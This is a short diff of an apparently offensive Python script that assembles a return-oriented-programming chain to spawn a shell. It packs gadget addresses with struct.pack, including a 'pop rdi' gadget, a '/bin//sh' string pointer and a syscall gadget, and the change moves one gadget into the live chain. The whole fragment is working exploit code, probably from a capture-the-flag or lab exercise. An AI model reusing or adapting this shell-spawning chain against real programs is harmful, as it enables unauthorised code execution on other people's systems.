@@ -35,10 +35,10 @@ shellcode += struct.pack('<q', d3)# 0
 # shellcode += struct.pack('<q', g3)
 # shellcode += struct.pack('<q', d4)
 # shellcode += struct.pack('<q', d5)
+shellcode += struct.pack('<q', g5)
 shellcode += struct.pack('<q', g4)#= pop rdi
 shellcode += struct.pack('<q', d6) #/bin//sh
 # shellcode += struct.pack('<q', d7)
-# shellcode += struct.pack('<q', g5)
 shellcode += struct.pack('<q', g6) #syscall
 
 print ("shellcode: "+ shellcode)
